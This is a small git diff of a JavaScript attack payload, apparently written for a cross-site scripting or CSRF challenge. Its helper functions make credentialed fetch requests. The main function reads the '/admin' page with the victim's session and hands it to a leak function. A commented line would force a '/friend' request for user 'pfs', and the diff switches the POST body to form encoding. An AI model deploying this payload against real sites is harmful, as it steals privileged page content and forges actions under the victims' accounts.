@@ -37,14 +37,15 @@ function getPageFetch(url) {
 
 // post via fetch
 function postPageFetch(url, data) {
-	fetch(url, {
+    fetch(url, {
         method: "POST",
         body: data,
-	mode: "no-cors",
-	credentials: "include",
+    mode: "no-cors",
+    credentials: "include",
         //body: JSON.stringify(data),
         headers: {
-          "Content-Type": "application/json"
+          //"Content-Type": "application/json"
+          "Content-Type": "application/x-www-form-urlencoded"
         },
     }).then(resp => resp.text())
         .then(function(resp) {
@@ -52,9 +53,10 @@ function postPageFetch(url, data) {
         })
 }
 
+
 async function main() {
  	leak(await getPageFetch('/admin'));
-	//leak( await postPageFetch('/admin', '["password":"hacked"]'));
+	//leak(await postPageFetch('/friend', 'username=pfs'));
  	//console.log(await getPageFetch('/'));
 }
 main();
